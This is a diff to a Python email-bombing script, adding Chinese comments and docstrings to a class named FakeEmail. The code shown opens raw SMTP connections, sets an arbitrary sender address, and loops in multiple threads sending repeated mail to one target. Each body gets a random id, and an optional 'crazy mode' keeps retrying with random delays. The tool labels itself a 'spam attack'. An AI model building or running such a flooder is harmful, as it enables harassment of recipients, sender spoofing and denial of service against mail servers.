@@ -22,13 +22,13 @@ class FakeEmail:
         Print(u"verbose level: "+str(verbose))
         Print(u"no problem, maybe", sign=u"  [*]")
 
-        self.to_addr = to_addr
-        self.from_addr = from_addr
-        self.port = port
-        self.timeout = timeout
-        self.SMTP_addr = SMTP_addr
-        self.quit_flag = 1
-        self.succ_num = 0
+        self.to_addr = to_addr  # 发送到哪个邮箱？
+        self.from_addr = from_addr  # 哪个邮箱发送的？
+        self.port = port  # SMTP 服务器的端口
+        self.timeout = timeout  # socket 超时时间
+        self.SMTP_addr = SMTP_addr  # SMTP 服务器的地址
+        self.quit_flag = 1  # 自己提醒自己退出
+        self.succ_num = 0  # 邮件发送成功的数量
 
     def Connect(self):
         """
@@ -86,104 +86,150 @@ class FakeEmail:
         作用: 通过 socket 向 SMTP 服务器发送信息
 
         参数:
-            msg: 要发送的信息
+            check: 根据 check 来检查收到的信息；
+                   若 check 在收到的信息里，则说明符合预期，否则不符合；
+                   check 为空则不进行检查。
+            threshold: 用于 Print 函数；SMTP 服务器传回的信息不一定都要打印出来；
 
         返回类型:
-            布尔
+            元组
 
         返回值:
-            True
-            False
+            (True, )
+            (False, 报错信息)
         """
 
         try:
+            # 收到的信息也以 "\r\n" 作为分割
             data = [i.decode(u"utf8") for i in self.sk.recv(1024).split(b"\r\n") if i]
-            assert data
-        except AssertionError:
+            assert data  # 确认一下消息不为空
+        except AssertionError:  # 若消息为空
             if not check:
                 Print(u"recv empty answer", threshold=0, color=u"red", sign=u"<= ", id=self.id)
-            return (0, u"recv empty answer")
-        except Exception as e:
+            return (False, u"recv empty answer")
+        except Exception as e:  # 若出现意外导致报错
             if not check:
                 Print(str(e), threshold=0, color=u"red", sign=u"<= ", id=self.id)
+            return (False, str(e))
 
-            return (0, str(e))
-
+        # 若进行检查且检查不符合预期，则返回信息的最后一行
         if check and check not in data[-1]:
-            return (0, data[-1])
+            return (False, data[-1])
 
+        # SMTP 的错误代码分布在 400-600之间
+        # 若错误代码不存在于信息的最后一行，则说明返回正确的信息
+        # 否则需要打印错误信息，返回信息的最后一行
         if any([i for i in range(400, 600) if data[-1][:3] == str(i)]):
             Print(data[-1], threshold=0, color=u"red", sign=u"<= ", id=self.id)
-            return (0, data[-1])
+            return (False, data[-1])
 
+        # 依次打印返回的信息
         for result in data:
             Print(result, threshold=threshold, color=u"green", sign=u"<= ")
 
-        return (1, data[-1])
+        return (True, data[-1])  # 这里的 data[-1] 不会用到
 
     def Attack(self, id):
+        """
+        作用: 攻击的主要代码
+
+        参数:
+            id: 线程的唯一标识
+        """
+
         global succ_num, failed_num, quit_flag, threads_alive, Data
 
         self.id = id
+
+        # 主线程没有发出退出指令，且自己没有发出退出指令
         while quit_flag and self.quit_flag:
             check_connect = self.Connect()
-            if not check_connect[0]:
+            if not check_connect[0]:  # 发起连接失败
                 Print(u"creating connection failed: "+u"I just got the answer: '%s' from %s" % (check_connect[1], self.SMTP_addr),
                       threshold=0, color=u"red", sign=u"[X]", flag=0, id=self.id)
                 self.sk.close()
                 failed_num += 1
-                if crazy_mode:
+                if crazy_mode:  # 为长连接模式，则继续尝试发起连接请求
                     continue
-                else:
+                else:  # 否则直接退出
                     break
 
             Print(u"now, all ready", sign=u"  [*]")
             Print(u"using spam attack", sign=u"[+]")
+
+            # ehlo 成功，且成功收到信息
             if not (self.Send(u"ehlo antispam") and self.Recv()[0]):
                 failed_num += 1
-                if crazy_mode:
+                if crazy_mode:  # 为长连接模式，则继续尝试 ehlo antispam
                     continue
-                else:
+                else:  # 否则直接退出
                     break
 
+            # 至此，线程不会再尝试 ehlo antispam，而是持续使用建立好的通道
+            # 主线程没有发出退出指令，且自身没有发出退出指令
             while quit_flag and self.quit_flag:
-                if not (self.Send(u"mail from:<%s>" % self.from_addr) and self.Recv()[0]) or\
-                        not (self.Send(u"rcpt to:<%s>" % self.to_addr) and self.Recv()[0]) or\
-                        not (self.Send(u"data") and self.Recv()[0]):
+                # 发送邮件头
+                if not (
+                    self.Send(u"mail from:<%s>" % self.from_addr) and self.Recv()[0]
+                ) or not (
+                    self.Send(u"rcpt to:<%s>" % self.to_addr) and self.Recv()[0]
+                ) or not (
+                    self.Send(u"data") and self.Recv()[0]
+                ):  # 三个有一个失败就认定为失败
 
                     failed_num += 1
-                    if not crazy_mode:
-                        self.quit_flag = 0
-                    continue
+                    if not crazy_mode:  # 不为长连接模式
+                        self.quit_flag = 0  # 发出自身退出指令
+                    continue  # 重新发送邮件头
 
-                if self.Send(u"to: %s" % self.to_addr) and\
-                        self.Send(u"from: %s" % self.from_addr) and\
-                        self.Send("subject: "+subject) and\
-                        self.Send(u"") and\
-                        self.Send(body+"\r\n\r\nYour random id is "+"".join(random.choice(string.hexdigits) for i in range(32))+"\r\n."):
+                # 发送邮件内容
+                if self.Send(
+                    u"to: %s" % self.to_addr
+                ) and self.Send(
+                    u"from: %s" % self.from_addr
+                ) and self.Send(
+                    "subject: "+subject
+                ) and self.Send(
+                    u""
+                ) and self.Send(
+                    body+"\r\n\r\nYour random id is "+"".join(
+                        random.choice(string.hexdigits) for i in range(32)
+                    )+"\r\n."
+                ):  # 四个都成功的话
 
-                    result = self.Recv(threshold=0, check=u"250")
-                    if result[0]:
+                    result = self.Recv(threshold=0, check=u"250")  # 检查返回状态码是否为 250
+                    if result[0]:  # 发送邮件成功
                         succ_num += 1
                         self.succ_num += 1
                         Data[id] = PutColor(self.succ_num, "cyan")
-                    else:
+                    else:  # 发送邮件失败
                         Print(result[1], threshold=0, color=u"red", sign=u"<= ", id=self.id)
                         failed_num += 1
-                else:
+                else:  # 四个有一个失败，说明发送邮件失败
                     failed_num += 1
 
-                if not crazy_mode:
-                    self.quit_flag = 0
+                if not crazy_mode:  # 若不为长连接模式
+                    self.quit_flag = 0  # 发出自身退出指令
                 else:
-                    sleep(random.random()*1.5)
+                    sleep(random.random()*1.5)  # 随机延时，准备下一封邮件的发送
 
         Print(u"all done", sign=u"  [*]")
-        threads_alive[id] = 0
-        return self.sk.close()
+        threads_alive[id] = 0  # 标记本线程已经结束
+        return self.sk.close()  # 关闭本线程的 socket 连接
 
 
 def PutColor(string, color):
+    """
+    作用：给终端加点颜色
+
+    参数：
+        string：要上色的字符串
+        color：颜色
+
+    返回类型：字符串
+    返回值：加了颜色的字符串
+    """
+
     colors = {
         u"gray": "2",
         u"red": "31",
@@ -199,31 +245,47 @@ def PutColor(string, color):
 
 
 def superPrint():
+    """
+    作用: 固定行打印
+
+    仅在 verbose 为 0 的时候启用
+    """
+
     Lock.acquire()
 
-    _, fixed_length = os.popen('stty size', 'r').read().split()
+    _, fixed_length = os.popen('stty size', 'r').read().split()  # 获得终端的长度
     fixed_length = int(fixed_length)
     for index in Indicator("attacking..."):
-
         for i, data in enumerate(Data):
-            _, length = os.popen('stty size', 'r').read().split()
+            _, length = os.popen('stty size', 'r').read().split()  # 获得终端的长度
             length = int(length)
-            if fixed_length > length:
-                show_logo()
+            if fixed_length > length:  # 若终端变窄
+                show_logo()  # 重新绘制终端
                 fixed_length = length
 
-            print("\033[K\r%s%s" % (PutColor("No.%d: " % i, "white"),
-                                    data if len(data) < length else data[:length-3]+"..."))
+            print(
+                "\033[K\r%s%s" % (
+                    PutColor("No.%d: " % i, "white"),
+                    data if len(data) < length else data[:length-3]+"..."
+                )
+            )  # 超出终端长度的部分用 ... 代替
 
         print(PutColor("\r\033[K[%d]" % succ_num, "green")+PutColor(index, "white")+"\033[1A")
         print("\033[%dA" % (len(Data)+1))
         sleep(0.1)
 
+    # 退出的时候，再打印一次
     for i, data in enumerate(Data):
-        print("\033[K\r%s%s" % (PutColor("No.%d: " % i, "white"),
-                                data if len(data) < length else data[:length-3]+"..."))
-    if crazy_mode != 1:
+        print(
+            "\033[K\r%s%s" % (
+                PutColor("No.%d: " % i, "white"),
+                data if len(data) < length else data[:length-3]+"..."
+            )
+        )
+
+    if crazy_mode != 1:  # 纯属美化，无实际作用
         print("")
+
     Lock.release()
 
 
